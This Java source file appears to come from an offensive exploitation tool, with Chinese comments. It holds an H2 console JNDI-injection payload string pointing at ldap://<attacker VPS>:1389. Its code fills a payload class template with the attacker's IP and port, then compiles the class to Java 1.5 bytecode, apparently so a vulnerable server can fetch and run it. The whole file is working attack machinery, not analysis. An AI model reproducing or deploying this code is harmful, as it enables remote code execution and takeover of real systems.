package src.main.LoadLib.ClassCom;

import src.main.impl.ResultCallback;

import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;

public class ClsComp {
    private String vpsIP;
    private String vpsPort;
    public String text;
    public String exp = "language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=ldap://%s:1389/src.main.template.JNDIObject.JNDIObject&user=&password=";

    public ClsComp(String vpsIP,String vpsPort){
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
    }

    // 编译class
    public boolean modifyJavaClassFile(String filename, String outfilename, ResultCallback callback) {
        try {
            String filepath = System.getProperty("user.dir") + "/src/main/template/" + filename;
            String outpath = System.getProperty("user.dir") + "/resources/" + outfilename;
            Path path = Paths.get(filepath);
            String content = new String(Files.readAllBytes(path));
            String filestr = Paths.get(filepath).getFileName().toString();
            String outfilestr = Paths.get(outfilename).getFileName().toString();
            String allcontent = String.format(content,vpsIP,vpsPort).replaceAll(filestr.substring(0, filestr.lastIndexOf(".")),outfilestr.substring(0, outfilestr.lastIndexOf(".")));
            // 去掉原包中的模板文件package
            allcontent = allcontent.replaceAll("package src.main.template.JNDIObject;","");
            Files.write(Paths.get(outpath), allcontent.getBytes());
            text = outfilestr + "文件写入成功";
            callback.onResult(text);
        } catch (IOException e) {
            text = outfilename.lastIndexOf("/") + "文件写入失败";
            callback.onResult(text);
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public void CompileJava(String filename,String outfile,ResultCallback callback){
        String filepath = System.getProperty("user.dir") + "/resources/" + filename;
        String outfilepath = System.getProperty("user.dir") + "/resources/" +  outfile;
        File fileToCompile = new File(filepath);

        // 获取系统编译器
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();

        // 检查编译器是否可用
        if (compiler == null) {
            text = "没有可用的编译器，请确认JRE或JDK是否配置";
            callback.onResult(text);
            return;
        }

        StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null);
        Iterable<? extends JavaFileObject> compilationUnits = fileManager.getJavaFileObjectsFromFiles(Arrays.asList(fileToCompile));
        Iterable<String> options = Arrays.asList("-source", "1.5", "-target", "1.5","-Xlint:-options");
        JavaCompiler.CompilationTask task = compiler.getTask(null, fileManager, null, options, null, compilationUnits);
        boolean success = task.call();
        try {
            fileManager.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        if (success) {
            text = outfile.replaceAll(".java",".class") + "文件编译成功";
            callback.onResult(text);
            File compiledFile = new File(outfilepath);
            // 移动文件到指定路径
            try {
                Path sourcePath = compiledFile.toPath();
                Path targetPath = new File(outfilepath).toPath();
                Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);
                text = "class文件移动到resources下";
                callback.onResult(text);
            } catch (IOException e) {
                text = "移动文件失败";
                callback.onResult(text);
                e.printStackTrace();
            }
        } else {
            text = "文件编译失败";
            callback.onResult(text);
        }
    }
}